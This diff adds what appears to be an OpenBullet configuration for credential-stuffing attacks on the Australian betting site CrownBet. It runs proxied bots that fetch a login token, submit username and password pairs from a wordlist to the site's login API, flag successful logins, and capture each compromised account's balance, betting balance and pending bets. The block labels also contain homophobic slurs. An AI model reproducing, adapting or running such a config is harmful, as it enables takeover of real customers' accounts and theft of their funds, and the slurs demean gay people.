@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Crown Bet",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-04T07:34:07.6004127+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherGET REQUEST GET "https://crownbet.com.au/?return-url=/my-account" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPanthersHOMO FUNCTION Constant "<USER>" -> VAR "HOMOO" 
+#HomoSexualPanthersSexual FUNCTION Constant "<PASS>" -> VAR "SEXUAL" 
+#HOMO PARSE "<SOURCE>" LR "        <input type=\"hidden\" name=\"_token\" value=\"" "\" />" Recursive=FALSE -> VAR "GOAT_IS_GAY" "" "" 
+#HomoSexualGOAT FUNCTION Constant "<GOAT_IS_GAY>" -> VAR "HOMO" 
+#HomoSexualPantherPOST REQUEST POST "https://crownbet.com.au/api/account/login" AutoRedirect=TRUE 
+  CONTENT "data%5BIdentifier%5D=<HOMOO>&data%5BPassword%5D=<SEXUAL>&_token=<HOMO>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualMINESWEEPER KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Please check your username or password" 
+  KEYCHAIN Success OR 
+    KEY "pendingBets\":" 
+#HomoSexualPanthersBalance PARSE "<SOURCE>" LR "balance\":" "," Recursive=FALSE -> CAP "Balance" "" "" 
+#HomoSexualPanthersBettingBalance PARSE "<SOURCE>" LR "bettingBalance\":" "," Recursive=FALSE -> CAP "Betting Balance" "" "" 
+#HomoSexualPanthersPendingBets PARSE "<SOURCE>" LR "pendingBets\":" "," Recursive=FALSE -> CAP "Pending Bets" "" "" 
